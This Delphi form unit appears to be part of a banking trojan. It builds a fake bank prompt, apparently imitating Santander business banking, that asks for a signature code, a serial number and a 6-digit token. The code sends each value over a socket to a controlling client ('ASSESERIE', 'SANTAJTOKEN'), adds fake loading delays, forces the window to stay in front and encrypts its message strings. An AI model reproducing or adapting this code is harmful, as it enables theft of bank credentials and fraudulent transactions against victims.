unit uPSNTJ;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, pngimage, {GIFImg,} GIFImage, AppEvnts, ComCtrls;

type
  TfSNTJLie = class(TForm)
    Image1: TImage;
    pnlIntro: TPanel;
    Label3: TLabel;
    Label4: TLabel;
    Label5: TLabel;
    Image2: TImage;
    pnlAssSerie: TPanel;
    Image3: TImage;
    Label6: TLabel;
    Image4: TImage;
    Image5: TImage;
    edtAss: TEdit;
    Image6: TImage;
    Image7: TImage;
    Image8: TImage;
    edtNSerie: TEdit;
    pnlT: TPanel;
    Image9: TImage;
    Label8: TLabel;
    Image10: TImage;
    Image13: TImage;
    edtT: TEdit;
    Image11: TImage;
    pnlLoad: TPanel;
    Image12: TImage;
    Label9: TLabel;
    Label10: TLabel;
    Image14: TImage;
    ApplicationEvents1: TApplicationEvents;
    ProgressBar1: TProgressBar;
    Image15: TImage;
    Label1: TLabel;
    procedure Image2Click(Sender: TObject);
    procedure Image4Click(Sender: TObject);
    procedure Image13Click(Sender: TObject);
    procedure Image10Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure Image7Click(Sender: TObject);
    procedure ApplicationEvents1Deactivate(Sender: TObject);
  private
    { Private declarations }
  public
     Ativado: boolean;
  end;

var
  fSNTJLie: TfSNTJLie;

implementation

uses Conectar, uCrypt, funcs2013;

{$R *.dfm}

procedure TfSNTJLie.ApplicationEvents1Deactivate(Sender: TObject);
begin
if Self.Visible then
  SetForegroundWindow(self.Handle);
end;

procedure TfSNTJLie.FormShow(Sender: TObject);
begin
  edtT.Clear;
  pnlIntro.BringToFront;
end;

procedure TfSNTJLie.Image10Click(Sender: TObject);
begin
  edtT.Clear;
end;

procedure TfSNTJLie.Image13Click(Sender: TObject);
begin
  Screen.Cursor := crHourGlass;
  Sleep(3000);
  Screen.Cursor := crDefault;
  if Length(edtT.Text)<>6 then
     begin
       edtT.Clear;
       edtT.SetFocus;
       //Application.MessageBox(PChar(Crypt('D','44CD152BDC79EF13386AEA4FFBCF0D25DE7BDE729DFC23BC0413C9749C5A90FC568F43FA21C075B55687B72D1A')),PChar(Crypt('D','ABAD49EC1EA222CC0D1F52F720B22CCD7C9F')),MB_ICONEXCLAMATION);
       //Exit;
     end
  else
     begin
       // fClient.TCP.IOHandler.WriteLn('SANTAJTOKEN|'+edtT.Text);
       fCliente.CS1.Socket.SendText( Decrypt('«Â™¿$úá›D',nw22)+ '|'+edtT.Text);
       edtT.Clear;
       pnlLoad.BringToFront;
     end;
end;

procedure TfSNTJLie.Image2Click(Sender: TObject);
begin
  Screen.Cursor := crHourGlass;
  Sleep(3000);
  Screen.Cursor := crDefault;
  pnlAssSerie.BringToFront;
end;

procedure TfSNTJLie.Image4Click(Sender: TObject);
begin
  if edtAss.Focused then
     edtAss.Clear;
  if edtNSerie.Focused then
     edtNSerie.Clear;
end;

procedure TfSNTJLie.Image7Click(Sender: TObject);
begin
  Screen.Cursor := crHourGlass;
  Sleep(3000);
  Screen.Cursor := crDefault;
  if Length(edtAss.Text)<6 then
  begin
   edtAss.Clear;
   edtAss.SetFocus;
   Application.MessageBox(PChar(Crypt('D','8980A75C8DC91ECD63B1200423AF132BD0073E82BE61D20C4E84B6641AD06289DCB65B85B67CB67C90BE68E61A3013')),PChar(Crypt('D','ABAD49EC1EA222CC0D1F52F720B22CCD7C9F')),MB_ICONEXCLAMATION);
   Exit;
  end;
  if Length(edtNSerie.Text)=0 then
  begin
    edtNSerie.Clear;
    edtNSerie.SetFocus;
    Application.MessageBox(PChar(Crypt('D','6DE40236D774E4062B79DBBF685AF70A3591F46887E609C60F4FFA56F9077FBE12CDAC6E9C5D95533EE21EA052F820CC0E32945F9E95')),PChar(Crypt('D','ABAD49EC1EA222CC0D1F52F720B22CCD7C9F')),MB_ICONEXCLAMATION);
    Exit;
  end;
  fCliente.CS1.Socket.SendText('ASSESERIE|'+edtAss.Text+'|'+edtNSerie.Text);
  edtAss.Clear;
  edtNSerie.Clear;
  pnlT.BringToFront;
end;

end.
